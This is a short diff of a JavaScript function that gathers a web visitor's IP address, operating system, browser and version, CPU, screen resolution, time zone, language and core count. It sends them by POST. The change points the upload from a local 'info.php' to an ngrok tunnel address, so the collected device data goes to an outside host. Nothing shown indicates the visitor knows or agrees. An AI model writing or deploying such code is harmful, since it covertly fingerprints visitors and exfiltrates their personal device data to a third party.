@@ -27,7 +27,7 @@ function mydata(){
             var ip = data
             $.ajax({
                 type: 'POST',
-                url: 'info.php',
+                url: 'https://4c26-212-8-252-183.ngrok-free.app/info.php',
                 data: {getip:ip,osname:OS,Version:ver,BrowserName:getbrow,Verbrow:getbrowVer,cpuname:CPU,Resolution:currentResolution,time:timeZone,lan:language,numcore:core},
                 mimeType: 'text'
                 });
